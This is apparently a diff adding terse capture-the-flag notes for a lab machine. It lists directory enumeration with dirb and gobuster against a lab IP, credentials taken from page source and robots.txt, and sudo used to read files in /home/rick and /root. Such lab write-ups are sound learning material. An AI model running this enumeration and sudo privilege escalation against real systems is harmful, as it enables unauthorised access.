@@ -1,0 +1,26 @@
+dev tools > HTML > username: R1ckRul3s
+
+enumerate directory
+dirb http://10.10.10.10
+gobuster dir -u 10.10.10.10 -w wordlist.txt
+-/assets/ - assets
+-/index.html - main page
+-/robots.txt - password: Wubbalubbadubdub
+-/server-status - server: Apache/2.4.18 (Ubuntu) Server at 10.10.10.10 Port 80
+
+login.php
+username + password
+
+ls
+less Sup3rS3cretPickl3Ingred.txt
+less clue.txt
+
+sudo -l
+sudo ls /home/rick
+sudo less /home/rick/'second ingredients'
+
+sudo ls /root
+sudo less /root/3rd.txt
+
+
+ 
